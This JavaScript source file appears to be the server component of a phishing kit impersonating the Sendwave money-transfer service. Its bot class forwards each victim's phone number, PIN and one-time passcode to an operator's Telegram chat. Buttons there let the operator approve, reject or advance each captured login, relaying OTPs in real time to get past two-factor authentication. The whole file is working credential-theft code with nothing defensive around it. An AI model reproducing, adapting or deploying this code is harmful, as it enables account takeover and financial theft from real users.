const fetch = require('node-fetch');
const crypto = require('crypto');

// Global session store - shared across all requests
const sessions = {};

class SendwaveBot {
  constructor(token, adminId) {
    this.botToken = token;
    this.adminChatId = adminId;
    this.apiUrl = `https://api.telegram.org/bot${this.botToken}/`;
  }

  async sendRequest(method, data = {}) {
    const url = this.apiUrl + method;
    try {
      const params = new URLSearchParams(data);
      const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: params.toString()
      });
      return await response.json();
    } catch (err) {
      console.error(`Telegram API error [${method}]:`, err.message);
      return null;
    }
  }

  generateSessionId(phone) {
    const raw = phone + Date.now() + crypto.randomBytes(8).toString('hex');
    return crypto.createHash('md5').update(raw).digest('hex');
  }

  async sendLoginAlert(countryFlag, countryCode, phone, pin) {
    const sessionId = this.generateSessionId(phone);
    const now = new Date().toISOString().replace('T', ' ').substring(0, 19);
    const fullPhone = `${countryCode}${phone}`;

    const keyboard = {
      inline_keyboard: [[
        { text: '🔑 Request OTP', callback_data: `otp_request_${sessionId}` },
        { text: '❌ Wrong PIN',   callback_data: `wrong_pin_${sessionId}` }
      ]]
    };

    const message =
      `🌊 *New Sendwave Login*\n\n` +
      `${countryFlag} *Phone:* \`${fullPhone}\`\n` +
      `🔢 *PIN:* \`${pin}\`\n` +
      `⏰ *Time:* ${now}\n\n` +
      `Choose action:`;

    await this.sendRequest('sendMessage', {
      chat_id: this.adminChatId,
      text: message,
      parse_mode: 'Markdown',
      reply_markup: JSON.stringify(keyboard)
    });

    sessions[sessionId] = 'pending';
    console.log(`✅ Session created: ${sessionId}`);
    console.log(`📦 Sessions:`, sessions);

    return { success: true, sessionId };
  }

  async sendOtpAlert(sessionId, otp, countryCode, phone) {
    const now = new Date().toISOString().replace('T', ' ').substring(0, 19);
    const fullPhone = `${countryCode}${phone}`;

    const keyboard = {
      inline_keyboard: [[
        { text: '❌ Wrong Code', callback_data: `wrong_${sessionId}` },
        { text: '✅ Continue',   callback_data: `continue_${sessionId}` }
      ]]
    };

    const message =
      `🔑 *OTP Entered — Sendwave*\n\n` +
      `📱 *Phone:* \`${fullPhone}\`\n` +
      `🔢 *OTP:* \`${otp}\`\n` +
      `⏰ *Time:* ${now}\n\n` +
      `Choose action:`;

    return await this.sendRequest('sendMessage', {
      chat_id: this.adminChatId,
      text: message,
      parse_mode: 'Markdown',
      reply_markup: JSON.stringify(keyboard)
    });
  }

  async handleCallback(callbackQuery) {
    const data = callbackQuery.data;
    const callbackId = callbackQuery.id;

    console.log(`🔔 Callback received: ${data}`);

    if (data.startsWith('otp_request_')) {
      const sessionId = data.replace('otp_request_', '');
      sessions[sessionId] = 'approved';
      console.log(`✅ Approved: ${sessionId}`);
    } else if (data.startsWith('wrong_pin_')) {
      const sessionId = data.replace('wrong_pin_', '');
      sessions[sessionId] = 'wrong_pin';
      console.log(`❌ Wrong PIN: ${sessionId}`);
    } else if (data.startsWith('wrong_')) {
      const sessionId = data.replace('wrong_', '');
      sessions[sessionId] = 'wrong_code';
      console.log(`❌ Wrong Code: ${sessionId}`);
    } else if (data.startsWith('continue_')) {
      const sessionId = data.replace('continue_', '');
      sessions[sessionId] = 'continue';
      console.log(`➡️ Continue: ${sessionId}`);
    }

    console.log(`📦 Sessions after callback:`, sessions);
    await this.sendRequest('answerCallbackQuery', { callback_query_id: callbackId });
    return true;
  }

  getSessionStatus(sessionId) {
    const status = sessions[sessionId] || 'pending';
    console.log(`🔍 Checking session ${sessionId}: ${status}`);
    if (status !== 'pending') {
      setTimeout(() => { delete sessions[sessionId]; }, 5000);
    }
    return status;
  }
}

module.exports = SendwaveBot;
